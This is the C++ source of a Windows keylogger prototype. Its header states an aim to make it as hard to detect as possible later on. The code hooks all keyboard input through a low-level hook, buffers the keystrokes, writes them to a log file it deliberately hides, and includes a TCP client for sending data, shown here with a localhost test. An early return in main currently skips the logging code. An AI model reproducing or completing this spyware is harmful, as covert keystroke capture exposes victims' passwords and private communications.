/**
        KEYLOGGER
    - Prototype keylogger, focused on learning how windows lower level programming works.
    - Will try to rewrite in C and make it as hard to detect as possible later on.
    - Main components - FILE I/O, Capturing keyboard input, sending TCP requests.
    @author EP
**/
#include <iostream>
#include <winsock2.h>
#include <Windows.h>
#include <fcntl.h>
#include <io.h>
#include<string>
#include<thread>
#include<fstream>
#include<mutex>
#include<condition_variable>
#include "tcpClient.cpp"


// name of the file which the data is saved to
#define TXT_FILE_NAME "loggedData.txt"

using namespace std;


// variables used for various purposes all throughout the code
HHOOK keyboardHook;
BYTE keyState[256] = { 0 };

int cpsLock = -1;
wstring tempBuffer;
wstring bufferCopy;
mutex mutx;

condition_variable cv;

int stdCount = 0;

bool dataReady = false;
// encrypt and save input form a buffer(wstring) to file
void FileSaveAndEncrypt()
{
    while(true){
        unique_lock<mutex> lock(mutx);

        cv.wait(lock,[]{return dataReady;});
        wcout<<"writing to the file..."<<endl;
        wofstream file(TXT_FILE_NAME,ios::app);
        if(file)
        {

            file << bufferCopy;
            wcout << bufferCopy<<endl;
            bufferCopy.clear();

        }
        dataReady=false;
    }
}

// callback function for LL keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    // if key is released, the switches are necessary to maintain the state of the keyboard
    // since function GetKeyboardState does not work when using LL hook
    if(nCode >= 0 && (wParam==WM_KEYUP || wParam==WM_SYSKEYUP))
    {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        //
        switch(pKeyStruct->vkCode)
        {
        case VK_LSHIFT:
        case VK_RSHIFT:
            keyState[VK_SHIFT] = 0;
            break;
        case VK_RMENU:
            wcout<<"[RALT UP]"<<endl;
            break;
        default:
            break;

        }
    }

    // if key is pressed
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {

        stdCount++;

        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        bool isMod = false;

        switch(pKeyStruct->vkCode)
        {
        case VK_LSHIFT:
        case VK_RSHIFT:
            keyState[VK_SHIFT] = 0x80;
            break;
        case VK_RMENU:
            wcout<<"[RALT DOWN]"<<endl;
            break;
        case VK_CAPITAL:
            wcout<<"[CAPS]"<<endl;
            cpsLock =cpsLock*-1;
            keyState[VK_CAPITAL] = cpsLock * 0x80;
            break;
        case VK_BACK:
            wcout<<"[BACKSPACE]"<<endl;
            break;
        default:
            HKL keyboardLayout = GetKeyboardLayout(0);
            WCHAR uniChar[1];

            int unicodeState = ToUnicodeEx(pKeyStruct->vkCode,0,keyState,uniChar,10,0,keyboardLayout);


            tempBuffer+=uniChar[0];

            if (stdCount == 20)
            {

                lock_guard<mutex> lock(mutx);

                bufferCopy = tempBuffer;
                tempBuffer.clear();
                stdCount = 0;

                dataReady=true;
                cv.notify_one();

            }

            break;
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


// check if the file already exists
bool fileExists(const string& filename)
{
    ifstream file(filename);
    return file.good();
}

int main()
{
    tcpClient* newClient = new tcpClient("127.0.0.1",(USHORT)1234);
    cout<<"socket created"<<endl;
    newClient->transmitData("aaaa");
    newClient->closeConnection();
    delete newClient;
    return 0;
    //modification for printing UTF-16 chars to console
    _setmode(_fileno(stdout), _O_U16TEXT);
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;

    thread fwThread(FileSaveAndEncrypt);        //this is run in a separate thread so the keystrokes can continue to be logged
    fwThread.detach();

    if(!fileExists(TXT_FILE_NAME))
    {
        wcout<<"making hidden file"<<endl;      //file initialization
        ofstream newFile (TXT_FILE_NAME);
        newFile<<"[START]";
        newFile.close();


        DWORD attributes = GetFileAttributes(TXT_FILE_NAME);        //hide the file for obvious reasons
        SetFileAttributes(TXT_FILE_NAME, attributes + FILE_ATTRIBUTE_HIDDEN);
    }

    //main message loop, does not occupy 100% CPU :D
    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
